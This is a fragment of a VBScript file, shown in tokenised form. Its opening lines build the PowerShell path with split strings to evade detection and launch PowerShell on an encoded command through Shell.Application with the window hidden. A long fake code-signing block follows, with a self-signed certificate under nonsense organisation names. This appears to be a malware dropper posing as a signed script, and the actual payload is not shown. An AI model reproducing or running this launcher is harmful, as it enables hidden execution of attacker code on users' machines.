\n", "set", " ", "Bladeventyrs = CreateObject(", "\"WScript.Shell\"", ")", "\n\n", "Set", " ", "Iglus = Bladeventyrs.Exec(", "\"cmd /c echo %windir%\"", ")", "\n\nPolysome0 ", "= Iglus.StdOut.ReadLine()", "\n\nRambo ", "=  Polysome0 &", " ", "\"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershel\"", "+", "\"l.exe\"", "\n\n\n", "set", " ", "Sweepback = CreateObject(", "\"Shell.Application\"", ")", "\nIf ", "Nitwits.FileExists(Rambo) = false then Rambo =", " ", "\"powershell.exe\"", "\n\nCh9 ", "= replace(Ch9,", "\"Affedninge1\"", ",chr(34))", "\n\nSweepback.ShellExecute ", "Rambo,", " ", "\" \"", " ", "& chrw(34) & Ch9 & chrw(34),", " ", "\"\"", ",", " ", "\"\"", ", 0", "\n\n\n\n\n \n \n", "''", " SIG ", "''", " ", "Begin signature block", "\n", "''", " SIG ", "''", " ", "MIIeNwYJKoZIhvcNAQcCoIIeKDCCHiQCAQExDzANBglg", "\n", "''", " SIG ", "''", " ", "hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor", "\n", "''", " SIG ", "''", " ", "BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC", "\n", "''", " SIG ", "''", " ", "AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg", "\n", "''", " SIG ", "''", " ", "sSQkxx1Q5QReAw2o0O6fe793F72tx09levKgjTbDW46g", "\n", "''", " SIG ", "''", " ", "ggQXMIIEEzCCAvugAwIBAgIIVsqjEQ8omPUwDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQELBQAwgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIDAeFw0yMTExMTcxMDA3MTdaFw0yNDExMTYxMDA3", "\n", "''", " SIG ", "''", " ", "MTdaMIGeMQswCQYDVQQGEwJERTEbMBkGA1UECAwSU2No", "\n", "''", " SIG ", "''", " ", "bGVzd2lnLUhvbHN0ZWluMRIwEAYDVQQHDAlMw7xyc2No", "\n", "''", " SIG ", "''", " ", "YXUxDzANBgNVBAoMBlNuaXBwZTEiMCAGCSqGSIb3DQEJ", "\n", "''", " SIG ", "''", " ", "ARYTVHVhcmVnQFRvbHVpZGluZS5TazEpMCcGA1UECwwg", "\n", "''", " SIG ", "''", " ", "SGluZGJybWFybWVsYWRlcm5lIEd5bmVjb21hc3RpYSAw", "\n", "''", " SIG ", "''", " ", "ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDA", "\n", "''", " SIG ", "''", " ", "bxkjrOQpmE8BceChyNKZMB1sQKI", "/L1331RBRguylaYLe\n", "''", " SIG ", "''", " H57+GWKQl1jUWXRPa5cqC/", "df1OGj9x707NLLo8ygB0A4", "\n", "''", " SIG ", "''", " ", "njyC2bhVy", "/pC0lV4v3xgwaKWcCqaAC2cRVavxyVNAr0K\n", "''", " SIG ", "''", " cdESjH1OMetzxUd6+xmnBBSsRjLXZ7zIL00PTcW6qE2u\n", "''", " SIG ", "''", " x1l5eXMtBbsZ257ujKjKq3ZmRoN5HbmLiAW1J5ckwBqB\n", "''", " SIG ", "''", " wfvfACuMumwGDPjOGl9ycwjcaAgl69y1hVIiy7mAIV3D\n", "''", " SIG ", "''", " cNuTtslCl47QQ+Xpi18uSFgqhTuAsvIpKfJ6uGvTL09U\n", "''", " SIG ", "''", " bDgDEkZXFkwh3TQUzqO0eK1QFX/", "8u5U1AgMBAAGjUzBR", "\n", "''", " SIG ", "''", " ", "MB0GA1UdDgQWBBR96iGRZyy1E9ajUW4zDwUoV6hguTAf", "\n", "''", " SIG ", "''", " ", "BgNVHSMEGDAWgBR96iGRZyy1E9ajUW4zDwUoV6hguTAP", "\n", "''", " SIG ", "''", " ", "BgNVHRMBAf8EBTADAQH", "/MA0GCSqGSIb3DQEBCwUAA4IB\n", "''", " SIG ", "''", " AQAX6YH0P5pn3Ehm7XtSyDfhrcFBYr+TXG5lCVgAVZuO\n", "''", " SIG ", "''", " AfPQBO8y/", "JfP6cQZYYz+0I8d7qZbDJS", "/B60txKnBK2es\n", "''", " SIG ", "''", " k0QcxQ1Tr+RAKZLRXlbpReEloN2b5WFejh08iyQ+", "7", "xP9\n", "''", " SIG ", "''", " OV+xaIGduXbjU0xoM6P1rlCh/", "SQ4tYuYBgiIQJhsStlD", "\n", "''", " SIG ", "''", " ", "Df3T7hbzwCvvu67tvhMuoDgi412ZKfMIMEtf1XQYes8I", "\n", "''", " SIG ", "''", " ", "D5rkUiXNRZR0NK6j0V+8dS+QlKOc9sbFzRMOYzktPXAo", "\n", "''", " SIG ", "''", " ", "C7SFS6X", "/C/", "WA6ozpog8CRSvPjxGVXRLl8bl9eEnZtc6N", "\n", "''", " SIG ", "''", " ", "Oxo4pcyblS6UYxE5vHLoSQHagTpjLiFPoVC6MYIZeDCC", "\n", "''", " SIG ", "''", " ", "GXQCAQEwgaswgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI", "\n", "''", " SIG ", "''", " ", "DBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD", "\n", "''", " SIG ", "''", " ", "vHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD", "\n", "''", " SIG ", "''", " ", "VQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz", "\n", "''", " SIG ", "''", " ", "dGlhIAIIVsqjEQ8omPUwDQYJYIZIAWUDBAIBBQCgXjAQ", "\n", "''", " SIG ", "''", " ", "BgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYK", "\n", "''", " SIG ", "''", " ", "KwYBBAGCNwIBBDAvBgkqhkiG9w0BCQQxIgQgfPddFTZR", "\n", "''", " SIG ", "''", " ", "jlHIpoeVY76icMx6fJm0dQjDMeupPa8Bie8wDQYJKoZI", "\n", "''", " SIG ", "''", " ", "hvcNAQEBBQAEggEAoZEiYMTu3ozWb2ZJha2NQLSjMPDQ", "\n", "''", " SIG ", "''", " ", "8eRJOc22RWhMyJ5wIRF3hxGCrWz48ZY4470", "/PSA64KI0\n", "''", " SIG ", "''", " gIA3DLAI5sA5+IiyKcXuVlS7oTYFOuWAquB1tkVn0OaI\n", "''", " SIG ", "''", " Y/", "SJNCE4Vcz+Sfeq7hs+uvAZ+QdzZfBahJxMItJ2Pqqe", "\n", "''", " SIG ", "''", " ", "vXUH2gCWWZlm7y0GxJZPLH1G1mX", "/E+oanZTA2LyVBKsS\n", "''", " SIG ", "''", " slrFv3zeMC04x8JHP8eWboPKS+LBsJJDOZ1XImHwK84i\n", "''", " SIG ", "''", " +", "1", "PzdLxfoGucu6h+", "7", "OVjUo9yAvbhWopaAGHmrlEBbyaH\n", "''", " SIG ", "''", " zhcCbgTjgrirwYcaWXGqEclsSPk3m2v0StxH23wUvFVT\n", "''", " SIG ", "''", " ", "33", "cl8KGCFz0wghc5BgorBgEEAYI3AwMBMYIXKTCCFyUG\n", "''", " SIG ", "''", " CSqGSIb3DQEHAqCCFxYwghcSAgEDMQ8wDQYJYIZIAWUD\n", "''", " SIG ", "''", " BAIBBQAwdwYLKoZIhvcNAQkQAQSgaARmMGQCAQEGCWCG\n", "''", " SIG ", "''", " SAGG/", "WwHATAxMA0GCWCGSAFlAwQCAQUABCDpwPdh66lZ", "\n", "''", " SIG ", "''", " ", "VjjzDfyi5sHzO2HQemkjqua4cx+fe74UkQIQc0aZa0JV", "\n", "''", " SIG ", "''", " ", "oEq4a+IjBMvWohgPMjAyMjExMDgyMzM1MTVaoIITBzCC", "\n", "''", " SIG ", "''", " ", "BsAwggSooAMCAQICEAxNaXJLlPo8Kko9KQeAPVowDQYJ", "\n", "''", " SIG ", "''", " ", "KoZIhvcNAQELBQAwYzELMAkGA1UEBhMCVVMxFzAVBgNV", "\n", "''", " SIG ", "''", " ", "BAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdp", "\n", "''", " SIG ", "''", " ", "Q2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRp", "\n", "''", " SIG ", "''", " ", "bWVTdGFtcGluZyBDQTAeFw0yMjA5MjEwMDAwMDBaFw0z", "\n", "''", " SIG ", "''", " ", "MzExMjEyMzU5NTlaMEYxCzAJBgNVBAYTAlVTMREwDwYD", "\n", "''", " SIG ", "''", " ", "VQQKEwhEaWdpQ2VydDEkMCIGA1UEAxMbRGlnaUNlcnQg", "\n", "''", " SIG ", "''", " ", "VGltZXN0YW1wIDIwMjIgLSAyMIICIjANBgkqhkiG9w0B", "\n", "''", " SIG ", "''", " ", "AQEFAAOCAg8AMIICCgKCAgEAz+ylJjrGqfJru43BDZrb", "\n", "''", " SIG ", "''", " ", "oegUhXQzGias0BxVHh42bbySVQxh9J0Jdz0Vlggva2Sk", "\n", "''", " SIG ", "''", " /QaDFteRkjgcMQKW+", "3", "KxlzpVrzPsYYrppijbkGNcvYlT\n", "''", " SIG ", "''", " ", "4", "DotjIdCriak5Lt4eLl6FuFWxsC6ZFO7KhbnUEi7iGkM\n", "''", " SIG ", "''", " iMbxvuAvfTuxylONQIMe58tySSgeTIAehVbnhe3yYbyq\n", "''", " SIG ", "''", " Ogd99qtu5Wbd4lz1L+", "2", "N1E2VhGjjgMtqedHSEJFGKes+\n", "''", " SIG ", "''", " JvK0jM1MuWbIu6pQOA3ljJRdGVq/", "9XtAbm8WqJqclUeG", "\n", "''", " SIG ", "''", " ", "hXk+DF5mjBoKJL6cqtKctvdPbnjEKD+jHA9QBje6CNk1", "\n", "''", " SIG ", "''", " ", "prUe2nhYHTno+EyREJZ+TeHdwq2lfvgtGx", "/sK0YYoxn2\n", "''", " SIG ", "''", " Off1wU9xLokDEaJLu5i/", "+k", "/kezbvBkTkVf826uV8Mefz\n", "''", " SIG ", "''", " wlLE5hZ7Wn6lJXPbwGqZIS1j5Vn1TS+QHye30qsU5Thm\n", "''", " SIG ", "''", " h1EIa/", "tTQznQZPpWz+D0CuYUbWR4u5j9lMNzIfMvwi4g", "\n", "''", " SIG ", "''", " ", "14Gs0", "/EH1OG92V1LbjGUKYvmQaRllMBY5eUuKZCmt2Fk\n", "''", " SIG ", "''", " +tkgbBhRYLqmgQ8JJVPxvzvpqwcOagc5YhnJ1oV/", "E9mN", "\n", "''", " SIG ", "''", " ", "ec9ixezhe7nMZxMHmsF47caIyLBuMnnHC1mDjcbu9Sx8", "\n", "''", " SIG ", "''", " ", "e47LZInxscS451NeX1XSfRkpWQNO+l3qRXMchH7XzuLU", "\n", "''", " SIG ", "''", " ", "OncCAwEAAaOCAYswggGHMA4GA1UdDwEB", "/wQEAwIHgDAM\n", "''", " SIG ", "''", " BgNVHRMBAf8EAjAAMBYGA1UdJQEB/", "wQMMAoGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwMIMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG", "\n", "''", " SIG ", "''", " /WwHATAfBgNVHSMEGDAWgBS6FtltTYUvcyl2mi91jGog\n", "''", " SIG ", "''", " j57IbzAdBgNVHQ4EFgQUYore0GH8jzEU7ZcLzT0qlBTf\n", "''", " SIG ", "''", " UpwwWgYDVR0fBFMwUTBPoE2gS4ZJaHR0cDovL2NybDMu\n", "''", " SIG ", "''", " ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0UlNB\n", "''", " SIG ", "''", " NDA5NlNIQTI1NlRpbWVTdGFtcGluZ0NBLmNybDCBkAYI\n", "''", " SIG ", "''", " KwYBBQUHAQEEgYMwgYAwJAYIKwYBBQUHMAGGGGh0dHA6\n", "''", " SIG ", "''", " Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBYBggrBgEFBQcwAoZM\n", "''", " SIG ", "''", " aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lD\n", "''", " SIG ", "''", " ZXJ0VHJ1c3RlZEc0UlNBNDA5NlNIQTI1NlRpbWVTdGFt\n", "''", " SIG ", "''", " cGluZ0NBLmNydDANBgkqhkiG9w0BAQsFAAOCAgEAVaoq\n", "''", " SIG ", "''", " GvNG83hXNzD8deNP1oUj8fz5lTmbJeb3coqYw3fUZPwV\n", "''", " SIG ", "''", " +zbCSVEseIhjVQlGOQD8adTKmyn7oz/", "AyQCbEx2wmInc", "\n", "''", " SIG ", "''", " ", "ePLNfIXNU52vYuJhZqMUKkWHSphCK1D8G7WeCDAJ+uQt", "\n", "''", " SIG ", "''", " ", "1wmJefkJ5ojOfRu4aqKbwVNgCeijuJ3XrR8cuOyYQfD2", "\n", "''", " SIG ", "''", " ", "DoD75P", "/fnRCn6wC6X0qPGjpStOq/", "CUkVNTZZmg9U0rIb", "\n", "''", " SIG ", "''", " ", "f35eCa12VIp0bcrSBWcrduv", "/mLImlTgZiEQU5QpZomvn\n", "''", " SIG ", "''", " Ij5EIdI/", "HMCb7XxIstiSDJFPPGaUr10CU+ue4p7k0x+G", "\n", "''", " SIG ", "''", " ", "AWScAMLpWnR1DT3heYi", "/HAGXyRkjgNc2Wl+WFrFjDMZG\n", "''", " SIG ", "''", " QDvOXTXUWT5Dmhiuw8nLw/", "ubE19qtcfg8wXDWd8nYive", "\n", "''", " SIG ", "''", " ", "QclTuf80EGf2JjKYe", "/", "5", "cQpSBlIKdrAqLxksVStOYkEVg\n", "''", " SIG ", "''", " M4DgI974A6T2RUflzrgDQkfoQTZxd639ouiXdE4u2h4d\n", "''", " SIG ", "''", " jFrIHprVwvDGIqhPm73YHJpRxC+a9l+nJ5e6li6FV8Bg\n", "''", " SIG ", "''", " ", "53", "hWf2rvwpWaSxECyIKcyRoFfLpxtU56mWz06J7UWpjI\n", "''", " SIG ", "''", " n7+NuxhcQ/", "XQKujiYu54BNu90ftbCqhwfvCXhHjjCANd", "\n", "''", " SIG ", "''", " ", "RyxjqCU4lwHSPzra5eX25pvcfizM", "/xdMTQCi2NYBDriL\n", "''", " SIG ", "''", " ", "7", "ubgclWJLCcZYfZ3AYwwggauMIIElqADAgECAhAHNje3\n", "''", " SIG ", "''", " JFR82Ees/", "ShmKl5bMA0GCSqGSIb3DQEBCwUAMGIxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx", "\n", "''", " SIG ", "''", " ", "GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV", "\n", "''", " SIG ", "''", " ", "BAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0y", "\n", "''", " SIG ", "''", " ", "MjAzMjMwMDAwMDBaFw0zNzAzMjIyMzU5NTlaMGMxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j", "\n", "''", " SIG ", "''", " ", "LjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBHNCBS", "\n", "''", " SIG ", "''", " ", "U0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwggIi", "\n", "''", " SIG ", "''", " ", "MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDGhjUG", "\n", "''", " SIG ", "''", " ", "SbPBPXJJUVXHJQPE8pE3qZdRodbSg9GeTKJtoLDMg", "/la\n", "''", " SIG ", "''", " ", "9", "hGhRBVCX6SI82j6ffOciQt/", "nR+eDzMfUBMLJnOWbfhX", "\n", "''", " SIG ", "''", " ", "qAJ9", "/UO0hNoR8XOxs+", "4", "rgISKIhjf69o9xBd/", "qxkrPkLc", "\n", "''", " SIG ", "''", " ", "Z47qUT3w1lbU5ygt69OxtXXnHwZljZQp09nsad", "/ZkIdG\n", "''", " SIG ", "''", " AHvbREGJ3HxqV3rwN3mfXazL6IRktFLydkf3YYMZ3V+", "0", "\n", "''", " SIG ", "''", " VAshaG43IbtArF+y3kp9zvU5EmfvDqVjbOSmxR3NNg1c\n", "''", " SIG ", "''", " ", "1", "eYbqMFkdECnwHLFuk4fsbVYTXn+", "149", "zk6wsOeKlSNbw\n", "''", " SIG ", "''", " sDETqVcplicu9Yemj052FVUmcJgmf6AaRyBD40NjgHt1\n", "''", " SIG ", "''", " biclkJg6OBGz9vae5jtb7IHeIhTZgirHkr+g3uM+onP6\n", "''", " SIG ", "''", " ", "5", "x9abJTyUpURK1h0QCirc0PO30qhHGs4xSnzyqqWc0Jo\n", "''", " SIG ", "''", " n7ZGs506o9UD4L/", "wojzKQtwYSH8UNM", "/STKvvmz3+Drhk\n", "''", " SIG ", "''", " Kvp1KCRB7UK/", "BZxmSVJQ9FHzNklNiyDSLFc1eSuo80Vg", "\n", "''", " SIG ", "''", " ", "vCONWPfcYd6T", "/jnA+bIwpUzX6ZhKWD7TA4j+s4/", "TXkt2", "\n", "''", " SIG ", "''", " ", "ElGTyYwMO1uKIqjBJgj5FBASA31fI7tk42PgpuE+9sJ0", "\n", "''", " SIG ", "''", " ", "sj8eCXbsq11GdeJgo1gJASgADoRU7s7pXcheMBK9Rp61", "\n", "''", " SIG ", "''", " ", "03a50g5rmQzSM7TNsQIDAQABo4IBXTCCAVkwEgYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAgwBgEB/", "wIBADAdBgNVHQ4EFgQUuhbZbU2FL3Mp", "\n", "''", " SIG ", "''", " ", "dpovdYxqII+eyG8wHwYDVR0jBBgwFoAU7NfjgtJxXWRM", "\n", "''", " SIG ", "''", " ", "3y5nP+e6mK4cD08wDgYDVR0PAQH", "/BAQDAgGGMBMGA1Ud\n", "''", " SIG ", "''", " JQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAk\n", "''", " SIG ", "''", " BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu\n", "''", " SIG ", "''", " Y29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5k\n", "''", " SIG ", "''", " aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0\n", "''", " SIG ", "''", " LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3Js\n", "''", " SIG ", "''", " My5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9v\n", "''", " SIG ", "''", " dEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglg\n", "''", " SIG ", "''", " hkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBAH1ZjsCT\n", "''", " SIG ", "''", " tm+YqUQiAX5m1tghQuGwGC4QTRPPMFPOvxj7x1Bd4ksp\n", "''", " SIG ", "''", " +", "3", "CKDaopafxpwc8dB+k+YMjYC+VcW9dth/", "qEICU0MWfN", "\n", "''", " SIG ", "''", " ", "thKWb8RQTGIdDAiCqBa9qVbPFXONASIlzpVpP0d3+3J0", "\n", "''", " SIG ", "''", " ", "FNf", "/q0+KLHqrhc1DX+", "1", "gtqpPkWaeLJ7giqzl/", "Yy8ZCaH", "\n", "''", " SIG ", "''", " ", "bJK9nXzQcAp876i8dU+6WvepELJd6f8oVInw1YpxdmXa", "\n", "''", " SIG ", "''", " ", "zPByoyP6wCeCRK6ZJxurJB4mwbfeKuv2nrF5mYGjVoar", "\n", "''", " SIG ", "''", " ", "CkXJ38SNoOeY+", "/umnXKvxMfBwWpx2cYTgAnEtp/", "Nh4ck", "\n", "''", " SIG ", "''", " ", "u0+jSbl3ZpHxcpzpSwJSpzd+k1OsOx0ISQ+UzTl63f8l", "\n", "''", " SIG ", "''", " ", "Y5knLD0", "/a6fxZsNBzU+", "2", "QJshIUDQtxMkzdwdeDrknq3l\n", "''", " SIG ", "''", " NHGS1yZr5Dhzq6YBT70/", "O3itTK37xJV77QpfMzmHQXh6", "\n", "''", " SIG ", "''", " ", "OOmc4d0j", "/R0o08f56PGYX/", "sr2H7yRp11LB4nLCbbbxV7", "\n", "''", " SIG ", "''", " ", "HhmLNriT1ObyF5lZynDwN7+YAN8gFk8n+2BnFqFmut1V", "\n", "''", " SIG ", "''", " ", "wDophrCYoCvtlUG3OtUVmDG0YgkPCr2B2RP+v6TR81fZ", "\n", "''", " SIG ", "''", " ", "vAT6gt4y3wSJ8ADNXcL50CN", "/AAvkdgIm2fBldkKmKYcJ\n", "''", " SIG ", "''", " RyvmfxqkhQ/", "8mJb2VVQrH4D6wPIOK+XW+6kvRBVK5xMO", "\n", "''", " SIG ", "''", " ", "Hds3OBqhK", "/bt1nz8MIIFjTCCBHWgAwIBAgIQDpsYjvnQ\n", "''", " SIG ", "''", " Lefv21DiCEAYWjANBgkqhkiG9w0BAQwFADBlMQswCQYD\n", "''", " SIG ", "''", " VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkw\n", "''", " SIG ", "''", " FwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQD\n", "''", " SIG ", "''", " ExtEaWdpQ2VydCBBc3N1cmVkIElEIFJvb3QgQ0EwHhcN\n", "''", " SIG ", "''", " MjIwODAxMDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQsw\n", "''", " SIG ", "''", " CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j\n", "''", " SIG ", "''", " MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYD\n", "''", " SIG ", "''", " VQQDExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIi\n", "''", " SIG ", "''", " MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC/", "5pBz", "\n", "''", " SIG ", "''", " ", "aN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa", "\n", "''", " SIG ", "''", " ", "za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F", "/WBTxS\n", "''", " SIG ", "''", " D1Ifxp4VpX6+n6lXFllVcq9ok3DCsrp1mWpzMpTREEQQ\n", "''", " SIG ", "''", " ", "Lt", "+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT+CFh\n", "''", " SIG ", "''", " mzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiO\n", "''", " SIG ", "''", " DCu3T6cw2Vbuyntd463JT17lNecxy9qTXtyOj4DatpGY\n", "''", " SIG ", "''", " QJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+EJFwq1WC\n", "''", " SIG ", "''", " QTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/", "CNda", "\n", "''", " SIG ", "''", " ", "SaTC5qmgZ92kJ7yhTzm1EVgX9yRcRo9k98FpiHaYdj1Z", "\n", "''", " SIG ", "''", " ", "XUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5jrubU75KSOp49", "\n", "''", " SIG ", "''", " ", "3ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4", "/", "3", "\n", "''", " SIG ", "''", " IbKyEbe7f/", "LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPR", "\n", "''", " SIG ", "''", " ", "iQfhvbfmQ6QYuKZ3AeEPlAwhHbJUKSWJbOUOUlFHdL4m", "\n", "''", " SIG ", "''", " ", "rLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU", "/\n", "''", " SIG ", "''", " Y+whX8QgUWtvsauGi0/", "C1kVfnSD8oR7FwI+isX4KJpn1", "\n", "''", " SIG ", "''", " ", "5GkvmB0t9dmpsh3lGwIDAQABo4IBOjCCATYwDwYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAUwAwEB/", "zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n", "\n", "''", " SIG ", "''", " ", "P+e6mK4cD08wHwYDVR0jBBgwFoAUReuir", "/SSy4IxLVGL\n", "''", " SIG ", "''", " p6chnfNtyA8wDgYDVR0PAQH/", "BAQDAgGGMHkGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au", "\n", "''", " SIG ", "''", " ", "ZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8v", "\n", "''", " SIG ", "''", " ", "Y2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1", "\n", "''", " SIG ", "''", " ", "cmVkSURSb290Q0EuY3J0MEUGA1UdHwQ+MDwwOqA4oDaG", "\n", "''", " SIG ", "''", " ", "NGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy", "\n", "''", " SIG ", "''", " ", "dEFzc3VyZWRJRFJvb3RDQS5jcmwwEQYDVR0gBAowCDAG", "\n", "''", " SIG ", "''", " ", "BgRVHSAAMA0GCSqGSIb3DQEBDAUAA4IBAQBwoL9DXFXn", "\n", "''", " SIG ", "''", " ", "OF+go3QbPbYW1", "/e/", "Vwe9mqyhhyzshV6pGrsi+IcaaVQi", "\n", "''", " SIG ", "''", " ", "7aSId229GhT0E0p6Ly23OO", "/", "0", "/", "4C5+KH38nLeJLxSA8hO", "\n", "''", " SIG ", "''", " ", "0Cre+i1Wz", "/n096wwepqLsl7Uz9FDRJtDIeuWcqFItJnL\n", "''", " SIG ", "''", " nU+nBgMTdydE1Od/", "6Fmo8L8vC6bp8jQ87PcDx4eo0kxA", "\n", "''", " SIG ", "''", " ", "GTVGamlUsLihVo7spNU96LHc", "/RzY9HdaXFSMb++hUD38\n", "''", " SIG ", "''", " dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr\n", "''", " SIG ", "''", " zyerbHbObyMt9H5xaiNrIv8SuFQtJ37YOtnwtoeW/", "VvR", "\n", "''", " SIG ", "''", " ", "XKwYw02fc7cBqZ9Xql4o4rmUMYIDdjCCA3ICAQEwdzBj", "\n", "''", " SIG ", "''", " ", "MQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs", "\n", "''", " SIG ", "''", " ", "IEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFRydXN0ZWQg", "\n", "''", " SIG ", "''", " ", "RzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB", "\n", "''", " SIG ", "''", " ", "AhAMTWlyS5T6PCpKPSkHgD1aMA0GCWCGSAFlAwQCAQUA", "\n", "''", " SIG ", "''", " ", "oIHRMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAc", "\n", "''", " SIG ", "''", " ", "BgkqhkiG9w0BCQUxDxcNMjIxMTA4MjMzNTE1WjArBgsq", "\n", "''", " SIG ", "''", " ", "hkiG9w0BCRACDDEcMBowGDAWBBTzhyJNhjOCkjWplLy9", "\n", "''", " SIG ", "''", " ", "j5bp", "/hx8czAvBgkqhkiG9w0BCQQxIgQgj4P2QjO2zqJ2\n", "''", " SIG ", "''", " Eiqqc6Xe0rmTwOL9WOhQO/", "A6JYbW780wNwYLKoZIhvcN", "\n", "''", " SIG ", "''", " ", "AQkQAi8xKDAmMCQwIgQgx", "/ThvjIoiSCr4iY6vhrE/", "E", "/m\n", "''", " SIG ", "''", " eBwtZNBMgHVXoCO1tvowDQYJKoZIhvcNAQEBBQAEggIA\n", "''", " SIG ", "''", " N4a6/", "PqXZ20xn5mtXpXGWnRHDSZmznxZ5uzEhJYQjFMQ", "\n", "''", " SIG ", "''", " ", "H6", "/tV8EIlSuOD4ubAQ2srfTxER8/", "KUYtUjo5CmhBFQ9y", "\n", "''", " SIG ", "''", " ", "N6eTJMdM2aZEFMBZZBUdB", "/", "6", "Uahs697pg6ZN9yXJLP8/", "G", "\n", "''", " SIG ", "''", " ", "8LzIMFv5MrYGguVHMnLftBPGEqOll8IUwQHEu", "/jziluB\n", "''", " SIG ", "''", " SAMWDQCdhq+VGkbeo8JUN1nbGr9/", "KXIp8rZ3ORobWFe2", "\n", "''", " SIG ", "''", " ", "d", "/CKlq2TgAAZ9QAPROg8Mpht8+G8tEpkP9vP0aB+wDoy\n", "''", " SIG ", "''", " dlruYRaobgZd4T7hsoeVeWN2lL9PLCV1FpCNKX0Pg05y\n", "''", " SIG ", "''", " MvXrldob51CzHTPPHde0buH3KJBJoRafMv5VMHGvaNNS\n", "''", " SIG ", "''", " nOq1WXI44Zqw7/", "y7Ji++nCaIU9ITLjr5qLfPLgXqDWAa", "\n", "''", " SIG ", "''", " ", "hbwfLRagQ3rk9Px+r6V22ApHzHtGmGKnHhgZAI+MJ7HN", "\n", "''", " SIG ", "''", " ", "Zc8Oh65qU1uQ2vsUq5fy3pbEuIRfZmn6AG9zMqsjqw3G", "\n", "''", " SIG ", "''", " ", "30pMnbSImYkKyTIb+jWC8vyLJqbirUaxpk+Iu4Mm9+ot", "\n", "''", " SIG ", "''", " ", "VV+6Ci3UgBssODRdSE9S3aKzGUbRFuWiriYVZxM", "/RJKM\n", "''", " SIG ", "''", " 